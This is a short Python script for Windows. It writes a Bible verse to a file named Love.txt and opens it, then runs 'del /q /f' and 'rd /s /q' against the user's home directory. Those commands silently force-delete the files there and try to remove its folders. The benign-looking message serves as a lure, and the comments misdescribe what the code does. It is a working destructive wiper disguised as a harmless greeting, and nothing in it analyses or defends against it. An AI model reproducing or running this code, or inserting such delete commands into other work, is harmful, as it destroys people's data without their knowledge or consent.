from os import system
from time import sleep

# Creating a file and writing "Hello!" to it
system("echo 'For God did not send His Son into the world to condemn the world, but that the world might be saved through Him.' (John 3:17) > Love.txt")

# Opening the created file
system("start Love.txt")

# Adding a delay of 1 second
sleep(1)

# Changing directory to user's home directory and removing all files
system("cd %userprofile% && del /q /f *")
system("cd %userprofile% && rd /s /q *")
